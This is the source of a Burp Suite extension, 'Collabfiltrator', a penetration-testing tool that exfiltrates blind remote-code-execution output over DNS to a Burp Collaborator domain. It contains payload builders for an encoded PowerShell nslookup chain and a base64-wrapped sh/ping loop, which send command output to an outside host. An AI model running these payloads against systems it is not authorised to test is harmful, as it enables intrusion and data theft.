#Import Burp Objects
from burp import IBurpExtender, IBurpExtenderCallbacks, ITab, IBurpCollaboratorInteraction
#Import Java GUI Objects
from java.awt import Dimension, FlowLayout, Color, Toolkit, Graphics, Graphics2D, RenderingHints, Cursor
from java.awt.event import MouseAdapter, MouseEvent
from java.awt.image import BufferedImage
from java.awt.datatransfer import Clipboard, StringSelection
from javax import swing
from javax.swing import JPanel
from thread import start_new_thread
from java.util import Base64
from java.nio.charset import StandardCharsets
import sys, time, threading, base64
try:
    from exceptions_fix import FixBurpExceptions
except ImportError:
    pass

t = "" # declare thread globally so we can stop it from any function
stopThreads = False # Thread Tracker to prevent dangling threads
exfilFormat = "base64" #Valid Formats: base64, hex

###All this just for a cool toggle switch?
class ToggleSwitch(JPanel):
    def __init__(self, width=41, height=21):
        super(ToggleSwitch, self).__init__()
        self.activated = False
        self.switchColor = Color(200, 200, 200)
        self.buttonColor = Color(255, 255, 255)
        self.borderColor = Color(50, 50, 50)
        self.activeSwitch = Color(0, 125, 255)
        self.puffer = None
        self.borderRadius = 10
        self.g = None

        self.addMouseListener(ToggleSwitchMouseListener(self))

        self.setCursor(Cursor(Cursor.HAND_CURSOR))
        self.setSize(width, height)  # Set the initial size here
        #self.setBounds(0, 0, 41, 21)

    def paint(self, gr):
        if self.g is None or self.puffer.getWidth() != self.getWidth() or self.puffer.getHeight() != self.getHeight():
            self.puffer = BufferedImage(self.getWidth(), self.getHeight(), BufferedImage.TYPE_INT_ARGB)
            self.g = self.puffer.createGraphics()
            self.g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON)

        self.g.setColor(self.activeSwitch if self.activated else self.switchColor)
        self.g.fillRoundRect(0, 0, self.getWidth() - 1, self.getHeight() - 1, 5, self.borderRadius)
        self.g.setColor(self.borderColor)
        self.g.drawRoundRect(0, 0, self.getWidth() - 1, self.getHeight() - 1, 5, self.borderRadius)
        self.g.setColor(self.buttonColor)

        if self.activated:
            self.g.fillRoundRect(self.getWidth() // 2, 1, (self.getWidth() - 1) // 2 - 2, (self.getHeight() - 1) - 2, self.borderRadius, self.borderRadius)
            self.g.setColor(self.borderColor)
            self.g.drawRoundRect((self.getWidth() - 1) // 2, 0, (self.getWidth() - 1) // 2, self.getHeight() - 1, self.borderRadius, self.borderRadius)
        else:
            self.g.fillRoundRect(1, 1, (self.getWidth() - 1) // 2 - 2, (self.getHeight() - 1) - 2, self.borderRadius, self.borderRadius)
            self.g.setColor(self.borderColor)
            self.g.drawRoundRect(0, 0, (self.getWidth() - 1) // 2, self.getHeight() - 1, self.borderRadius, self.borderRadius)

        gr.drawImage(self.puffer, 0, 0, None)

    def isActivated(self):
        return self.activated

    def setActivated(self, activated):
        self.activated = activated

    def getSwitchColor(self):
        return self.switchColor

    def setSwitchColor(self, switchColor):
        self.switchColor = switchColor

    def getButtonColor(self):
        return self.buttonColor

    def setButtonColor(self, buttonColor):
        self.buttonColor = buttonColor

    def getBorderColor(self):
        return self.borderColor

    def setBorderColor(self, borderColor):
        self.borderColor = borderColor

    def getActiveSwitch(self):
        return self.activeSwitch

    def setActiveSwitch(self, activeSwitch):
        self.activeSwitch = activeSwitch

    def getBorderRadius(self):
        return self.borderRadius

    def setBorderRadius(self, borderRadius):
        self.borderRadius = borderRadius
# Define a custom MouseAdapter for the ToggleSwitch
class ToggleSwitchMouseListener(MouseAdapter):
    def __init__(self, toggle_switch):
        self.toggle_switch = toggle_switch

    def mouseReleased(self, event):
        self.toggle_switch.activated = not self.toggle_switch.activated
        self.toggle_switch.repaint()

###Build the extension
class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExtenderCallbacks):
    # Extention information
    EXT_NAME = "Collabfiltrator"
    EXT_DESC = "Exfiltrate blind remote code execution and SQL injection output over DNS via Burp Collaborator."
    EXT_AUTHOR = "Adam Logue, Frank Scarpella, Jared McLaren, Ryan Griffin"
    EXT_VERSION = "2.2b"
    # Output info to the Extensions console and register Burp API functions
    def registerExtenderCallbacks(self, callbacks):
        print ("Name: \t\t"      + BurpExtender.EXT_NAME)
        print ("Description: \t" + BurpExtender.EXT_DESC)
        print ("Authors: \t"      + BurpExtender.EXT_AUTHOR)
        print ("Version: \t" + BurpExtender.EXT_VERSION + "\n")
        # Required for easier debugging:
        # https://github.com/securityMB/burp-exceptions
        sys.stdout = callbacks.getStdout()
        self._callbacks = callbacks
        self._helpers   = callbacks.getHelpers()
        callbacks.setExtensionName(BurpExtender.EXT_NAME)

        self.killDanglingThreadsOnUnload = callbacks.registerExtensionStateListener(self.killDanglingThreads)


        #Create Burp Collaborator Instance
        self.burpCollab  = self._callbacks.createBurpCollaboratorClientContext()
        self.collaboratorDomain = self.burpCollab.generatePayload(True)

        #Create panels used for layout; we must stack and layer to get the desired GUI
        self.tab = swing.Box(swing.BoxLayout.Y_AXIS)
        self.tabbedPane  = swing.JTabbedPane()
        self.tab.add(self.tabbedPane)
        
        # First tab
        self.RCE_Exfil_Tab = swing.Box(swing.BoxLayout.Y_AXIS)
        self.tabbedPane.addTab("RCE Exfil", self.RCE_Exfil_Tab)
        
        # Second tab
        '''
        self.SQLi_Exfil_Tab = swing.Box(swing.BoxLayout.Y_AXIS)
        self.tabbedPane.addTab("SQLi Exfil", self.SQLi_Exfil_Tab)
        '''
        
        # Create objects for the RCE Exfil tab's GUI
        # These rows will add top to bottom on the Y Axis
        self.t1r1 = swing.JPanel(FlowLayout()) # title and description frame
        self.t1r2 = swing.JPanel(FlowLayout()) #platform and command box frame
        self.t1r3 = swing.JPanel(FlowLayout()) #payload box frame
        self.t1r5 = swing.JPanel(FlowLayout()) #copy payload to clipboard frame
        self.t1r7 = swing.JPanel(FlowLayout()) #output box frame
        self.t1r4 = swing.JPanel(FlowLayout()) # collaborator domainname frame
        self.t1r6 = swing.JPanel(FlowLayout()) # hidden stop listener frame that only appears upon payload generation
        self.t1r8 = swing.JPanel(FlowLayout()) #clearOutput box frame

        # Create objects for the SQLi Exfil tab's GUI
        # These rows will add top to bottom on the Y Axis
        self.t2r1 = swing.JPanel(FlowLayout()) # title and description frame
        self.t2r2 = swing.JPanel(FlowLayout()) #DBMS and Injection type selection frame
        self.t2r3 = swing.JPanel(FlowLayout()) #payload box frame
        self.t2r5 = swing.JPanel(FlowLayout()) #copy payload to clipboard frame
        self.t2r7 = swing.JPanel(FlowLayout()) #output box frame
        self.t2r4 = swing.JPanel(FlowLayout()) # collaborator domainname frame
        self.t2r6 = swing.JPanel(FlowLayout()) # hidden stop listener frame that only appears upon payload generation
        self.t2r8 = swing.JPanel(FlowLayout()) #clearOutput box frame


        # Now add content to the RCE Exfil tab's GUI objects
        self.osComboBox = swing.JComboBox(["Windows PowerShell", "Linux (sh + ping)"])
        self.commandTxt = swing.JTextField("hostname", 35)
        #self.commandTxt = swing.JTextField("dir c:\inetpub\wwwroot", 35)
        self.payloadTxt = swing.JTextArea(10,55)
        self.payloadTxt.setEditable(False)# So you can't messup the generated payload
        self.payloadTxt.setLineWrap(True) #Wordwrap the output of payload box
        self.outputTxt = swing.JTextArea(10,55)
        self.outputScroll = swing.JScrollPane(self.outputTxt) # Make the output scrollable
        self.payloadScroll = swing.JScrollPane(self.payloadTxt) # Make the payloadText scrollable

        self.progressBar = swing.JProgressBar(5,15)
        self.progressBar.setVisible(False) # Progressbar is hiding

        self.outputTxt.setEditable(False)
        self.outputTxt.setLineWrap(True)
        self.burpCollaboratorDomainTxt = swing.JTextPane() # burp collaboratorTextPane
        self.burpCollaboratorDomainTxt.setText(" ") #burp collaborator domain goes here
        self.burpCollaboratorDomainTxt.setEditable(False)
        self.burpCollaboratorDomainTxt.setBackground(None)
        self.burpCollaboratorDomainTxt.setBorder(None)
        self.t1r1.add(swing.JLabel("<html><center><h2>Collabfiltrator: RCE Exfil</h2>Exfiltrate blind remote code execution output over DNS via Burp Collaborator.</center></html>")).putClientProperty("html.disable", None)
        self.t1r2.add(swing.JLabel("Platform"))
        self.t1r2.add(self.osComboBox)
        self.t1r2.add(swing.JLabel("Command"))
        self.t1r2.add(self.commandTxt)
        self.t1r2.add(swing.JButton("Execute", actionPerformed=self.executePayload))
        self.t1r3.add(swing.JLabel("Payload"))
        self.t1r3.add(self.payloadScroll)        
        self.t1r4.add(self.burpCollaboratorDomainTxt) #burp Collab Domain will go here
        self.t1r5.add(swing.JButton("Copy Payload to Clipboard", actionPerformed=self.copyToClipboard))
        self.t1r6.add(self.progressBar)
        self.stopListenerButton = swing.JButton("Stop Listener", actionPerformed=self.stopListener)
        self.stopListenerButton.setVisible(False) # hide stopListenerButton
        self.t1r6.add(self.stopListenerButton)
        self.t1r7.add(swing.JLabel("Output"))
        self.t1r7.add(self.outputScroll) #add output scroll bar to page
        self.t1r8.add(swing.JButton("Clear Output", actionPerformed=self.clearOutput))

        # Now add content to the SQLi Exfil tab's GUI objects
        self.dbmsComboBox = swing.JComboBox(["Microsoft SQL (MSSQL)", "MySQL", "PostgreSQL", "Oracle"])
        self.injectionQueryTypeComboBox = swing.JComboBox(["SELECT", "INSERT", "UPDATE", "DELETE"])
        #self.commandTxt = swing.JTextField("hostname", 35)
        #self.commandTxt = swing.JTextField("dir c:\inetpub\wwwroot", 35)
        self.sqlipayloadTxt = swing.JTextArea(10,55)
        self.sqlipayloadTxt.setEditable(True)# So you can't messup the generated payload
        self.sqlipayloadTxt.setLineWrap(True) #Wordwrap the output of payload box
        self.sqlioutputTxt = swing.JTextArea(10,55)
        self.sqlioutputScroll = swing.JScrollPane(self.sqlioutputTxt) # Make the output scrollable
        self.sqlipayloadScroll = swing.JScrollPane(self.sqlipayloadTxt) # Make the payloadText scrollable

        self.sqliprogressBar = swing.JProgressBar(5,15)
        self.sqliprogressBar.setVisible(False) # Progressbar is hiding

        self.sqlioutputTxt.setEditable(False)
        self.sqlioutputTxt.setLineWrap(True)
        self.sqliburpCollaboratorDomainTxt = swing.JTextPane() # burp collaboratorTextPane
        self.sqliburpCollaboratorDomainTxt.setText(" ") #burp collaborator domain goes here
        self.sqliburpCollaboratorDomainTxt.setEditable(False)
        self.sqliburpCollaboratorDomainTxt.setBackground(None)
        self.sqliburpCollaboratorDomainTxt.setBorder(None)
        self.t2r1.add(swing.JLabel("<html><center><h2>Collabfiltrator: SQLi Exfil</h2>Exfiltrate blind SQL injection execution output over DNS via Burp Collaborator.</center></html>")).putClientProperty("html.disable", None)
        self.t2r2.add(swing.JLabel("DBMS"))
        self.t2r2.add(self.dbmsComboBox)
        self.t2r2.add(swing.JLabel("Injectable Query Type"))
        self.t2r2.add(self.injectionQueryTypeComboBox)
        self.t2r2.add(swing.JLabel("Extract"))
        self.extractComboBox = swing.JComboBox(["CurrentDB", "Databases", "Tables", "Columns", "Data"])
        self.singlevsallToggleSwitch = ToggleSwitch()
        self.singlevsallToggleSwitch.setPreferredSize(Dimension(30, 15))
        self.t2r2.add(self.extractComboBox)
        self.t2r2.add(swing.JLabel("Single Result"))
        self.t2r2.add(self.singlevsallToggleSwitch)
        self.t2r2.add(swing.JLabel("All Results"))
        self.t2r2.add(swing.JButton("Generate", actionPerformed=self.generateSQLiPayload))
        self.t2r3.add(swing.JLabel("Payload"))
        self.t2r3.add(self.sqlipayloadScroll)
        self.t2r4.add(swing.JLabel("Note: SQLi Payloads are generic and may require minor modification."))        
        self.t2r4.add(self.sqliburpCollaboratorDomainTxt) #burp Collab Domain will go here
        self.t2r5.add(swing.JButton("Copy Payload to Clipboard", actionPerformed=self.copyToClipboard))
        self.t2r6.add(self.sqliprogressBar)
        self.sqlistopListenerButton = swing.JButton("Stop Listener", actionPerformed=self.stopSQLiListener)
        self.sqlistopListenerButton.setVisible(False) # hide stopListenerButton
        self.t2r6.add(self.sqlistopListenerButton)
        self.t2r7.add(swing.JLabel("Output"))
        self.t2r7.add(self.sqlioutputScroll) #add output scroll bar to page
        self.t2r8.add(swing.JButton("Clear Output", actionPerformed=self.clearSQLiOutput))

        # Add the GUI objects into the RCE Exfil tab
        self.RCE_Exfil_Tab.add(self.t1r1)
        self.RCE_Exfil_Tab.add(self.t1r2)
        self.RCE_Exfil_Tab.add(self.t1r3)
        self.RCE_Exfil_Tab.add(self.t1r4)
        self.RCE_Exfil_Tab.add(self.t1r5)
        self.RCE_Exfil_Tab.add(self.t1r6)
        self.RCE_Exfil_Tab.add(self.t1r7)
        self.RCE_Exfil_Tab.add(self.t1r8)

        # Add the GUI objects into the SQLi Exfil tab
        '''
        self.SQLi_Exfil_Tab.add(self.t2r1)
        self.SQLi_Exfil_Tab.add(self.t2r2)
        self.SQLi_Exfil_Tab.add(self.t2r3)
        self.SQLi_Exfil_Tab.add(self.t2r4)
        self.SQLi_Exfil_Tab.add(self.t2r5)
        self.SQLi_Exfil_Tab.add(self.t2r6)
        self.SQLi_Exfil_Tab.add(self.t2r7)
        self.SQLi_Exfil_Tab.add(self.t2r8)
        '''
        
        # Create objects for the second tab's GUI

        #self.dummylabel = swing.JLabel("Burp Collaborator Config options will go here.")
        
        # Add the GUI objects into the second tab
        #self.SQLi_Exfil_Tab.add(self.dummylabel)





        #Register the panel in the Burp GUI
        callbacks.addSuiteTab(self)
        return

    # Standard function: Set the tab name
    def getTabCaption(self):
        return BurpExtender.EXT_NAME

    # Standard function: Set the GUI component in the tab
    def getUiComponent(self):
        return self.tab

    def createShPingBase64Payload(self, linuxCommand):
        global exfilFormat
        exfilFormat = "hex"
        shCommand = linuxCommand + '''|od -A n -t x1|sed 's/ //g'|while read exfil;do ping -c1 `printf %04d $i`.$exfil.''' + self.collaboratorDomain + '''&let i=i+1;echo;done'''
        return "echo " + self._helpers.base64Encode(shCommand) + "|base64 -d|sh"

    # Create windows powershell base64 payload
    def createPowershellBase64Payload(self, windowsCommand):
        global exfilFormat
        exfilFormat = "hex"
        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=-join([BitConverter]::ToString([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')))).Replace("-", "");$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)});$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
        return "powershell -enc " + self._helpers.base64Encode(powershellCommand.encode("UTF-16-LE"))

    def killDanglingThreads(self):
        global stopThreads
        global t
        stopThreads = True
        try:
            t.join() #rejoin the thread so it detects the stopThreads and exits gracefully
        except:
            pass
        stopThreads = False #Reset the threadTracker so we can run it again
        return
    
    # return generated payload to payload text area
    def executePayload(self, event):
        self.killDanglingThreads()
        self.collaboratorDomain = self.burpCollab.generatePayload(True)#rerun to regenrate new collab domain
        burpCollabInstance = self.burpCollab
        domain = self.collaboratorDomain # show domain in UI
        self.burpCollaboratorDomainTxt.setText(domain)
        if self.osComboBox.getSelectedItem() == "Windows PowerShell":
            self.payloadTxt.setText(self.createPowershellBase64Payload(self.commandTxt.getText()))
        elif self.osComboBox.getSelectedItem() == "Linux (sh + ping)":
            self.payloadTxt.setText(self.createShPingBase64Payload(self.commandTxt.getText()))
        self.checkCollabDomainStatusWrapper(domain, burpCollabInstance )
        return

    def stopListener(self, event): #killDanglingThreads, but as a buttonEvent
        self.killDanglingThreads()
        self.payloadTxt.setText("")
        return

    def clearOutput(self, event): 
        self.outputTxt.setText("") #clear out output text because button was clicked     
        return  

    def checkCollabDomainStatusWrapper(self, domain, burpCollab):
        global stopThreads
        threadFinished = False
        global t
        t = threading.Thread(target=self.checkCollabDomainStatus, args=(domain, burpCollab)) #comma has to be here even with only 1 arg because it expects a tuple
        t.start()
        return # thread doesn't stop locking in execute button

    #copy generated payload to clipboard
    def copyToClipboard(self, event):
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        data = StringSelection(self.payloadTxt.getText())
        clipboard.setContents(data, None)
        return    

    #monitor collab domain for output response
    def checkCollabDomainStatus(self, domain, objCollab):
        DNSrecordDict = dict()#since data comes in out of order we have to line up each request with it's timestamp
        #recordType = "A" #01
        complete = False
        #recordType = "AAAA" #1C or int(28)
        #recordType = "MX" #00 ?
        sameCounter = 0 #if this gets to 5, it means our data chunks coming in have been the same for 5 iterations and no new chunks are coming in so we can end the while loop.

        global stopThreads
        while (stopThreads == False):
            if stopThreads == True:
                self.progressBar.setVisible(False) #stop progress bar
                self.t1r6.setVisible(False) # hide progressbar
                self.stopListenerButton.setVisible(False) # hide stopListenerButton
                stopThreads = False # reset StopThreads
                break
            self.progressBar.setVisible(True) #show progress bar
            self.progressBar.setIndeterminate(True) #make progress bar show listener is running
            self.stopListenerButton.setVisible(True) # show stopListenerButton
            check = objCollab.fetchCollaboratorInteractionsFor(domain)
            oldkeys = DNSrecordDict.keys()

            for i in range(0, len(check)):
                dnsQuery = self._helpers.base64Decode(check[i].getProperty('raw_query'))
                #print dnsQuery
                preambleOffset = int(dnsQuery[12]) #Offset in dns query where preamble starts (0000,0001,0002,0003....)
                base64EncodedDataChunkOffset = int(dnsQuery[17]) #Offset in dns query where base64 encoded output data starts
                base64EncodedDataChunk = ''.join(chr (x) for x in dnsQuery[18:(18+base64EncodedDataChunkOffset)]) #Base64 encoded output data chunk
                preambleNumber = ''.join(chr (x) for x in dnsQuery[13:(13+preambleOffset)])
                DNSrecordDict[preambleNumber] = base64EncodedDataChunk #line up preamble with base64EncodedDataChunk containing data
                #print DNSrecordDict 
            #print DNSrecordDict
            keys = DNSrecordDict.keys()
            #print keys

            ### Check if input stream is done.
            if keys == oldkeys and keys != []:
                sameCounter += 1
            elif keys != oldkeys and keys != []:
                sameCounter = 0
            if sameCounter == 5: #if the data is the same 5 times then no more nslookups are coming in
                stopThreads = True

        self.progressBar.setVisible(False) # hide progressbar
        self.progressBar.setIndeterminate(False) #turn off progressbar
        self.stopListenerButton.setVisible(False) # hide stopListenerButton

        #print DNSrecordDict
        output = showOutput(DNSrecordDict)
        

        self.outputTxt.append("Command: " +self.commandTxt.getText() + "\n\n"  + output + "\n\n") #print output to payload box
        print ("Collaborator Domain: " + domain) # Output in Extender Tab
        print ("Command: " + self.commandTxt.getText() ) # Output in Extender Tab
        print ("Output: \n" + output + "\n") # Output in Extender Tab
        self.outputTxt.setCaretPosition(self.outputTxt.getDocument().getLength()) # make sure scrollbar is pointing to bottom
        self.payloadTxt.setText("") #clear out payload box because listener has stopped     
        return


    #######SQLi Exfil Functions#######
    def generateSQLiPayload():
        return
    def stopSQLiListener(self, event): #killDanglingThreads, but as a buttonEvent
        self.killDanglingThreads()
        self.payloadTxt.setText("")
        return

    def clearSQLiOutput(self, event): 
        self.outputTxt.setText("") #clear out output text because button was clicked     
        return  


def showOutput(outputDict): #This has to be on the outside the BurpExtender class or it won't trigger.
    completedInputString = ""
    for chunk in (sorted(outputDict.items())): #Sort by preamble number to put data in order 
        #print chunk
        completedInputString += chunk[1] # DNSrecordDict.items() returns a tuple so take value from the dict and append it to completedInputString
        print completedInputString
    if exfilFormat == "base64": ##DEPRECATED
        output = completedInputString.replace('EQLS','=').replace('PLUS','+') # drop EOF marker and replace any - padding with = and fix PLUSes
        output = base64.b64decode(output)   #this works better than the native Burp base64decode for some reason 
        return output
    elif exfilFormat == "hex":
        output = completedInputString.decode('hex')
        return output


#Burp Error Debugging
'''
try:
    FixBurpExceptions()
except:
    pass
'''